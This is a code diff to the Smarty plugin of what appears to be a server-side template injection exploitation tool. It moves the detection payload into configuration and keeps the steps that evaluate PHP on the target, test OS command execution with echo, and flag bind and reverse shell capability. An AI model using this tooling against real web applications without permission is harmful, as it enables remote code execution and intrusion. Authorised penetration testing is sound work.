@@ -12,7 +12,16 @@ class Smarty(Plugin):
         'render' : {
             'render': '{%(code)s}',
             'header': '{%(header)s}',
-            'trailer': '{%(trailer)s}'
+            'trailer': '{%(trailer)s}',
+            'render_test': """%(r1)s}{*%(comment)s*}{%(r2)s""" % { 
+                'r1' : rand.randints[0],
+                'comment' : rand.randints[1],
+                'r2' : rand.randints[2]
+            },
+            'render_expected': '%(r1)s%(r2)s' % { 
+                'r1' : rand.randints[0],
+                'r2' : rand.randints[2]
+            }
         },
         'write' : {
             'call' : 'evaluate',
@@ -84,33 +93,20 @@ class Smarty(Plugin):
 
     def rendered_detected(self):
 
-        randA = rand.randstr_n(1)
-        randB = rand.randstr_n(1)
+        os = self.evaluate("""echo PHP_OS;""")
+        if os and re.search('^[\w-]+$', os):
+            self.set('os', os)
+            self.set('evaluate', self.language)
+            self.set('write', True)
+            self.set('read', True)
 
-        payload = '%s{*%s*}%s' % (randA, rand.randstr_n(1), randB)
-        expected = randA + randB
-
-        if expected == self.render(payload):
-            self.set('engine', self.plugin.lower())
-            self.set('language', self.language)
-
-            os = self.evaluate("""echo PHP_OS;""")
-            if os and re.search('^[\w-]+$', os):
-                self.set('os', os)
-                self.set('evaluate', self.language)
-                self.set('write', True)
-                self.set('read', True)
-
-                expected_rand = str(rand.randint_n(2))
-                if expected_rand == self.execute('echo %s' % expected_rand):
-                    self.set('execute', True)
-                    self.set('bind_shell', True)
-                    self.set('reverse_shell', True)
+            expected_rand = str(rand.randint_n(2))
+            if expected_rand == self.execute('echo %s' % expected_rand):
+                self.set('execute', True)
+                self.set('bind_shell', True)
+                self.set('reverse_shell', True)
 
     def blind_detected(self):
-
-        self.set('engine', self.plugin.lower())
-        self.set('language', self.language)
 
         # Blind has been detected so code has been already evaluated
         self.set('evaluate_blind', self.language)
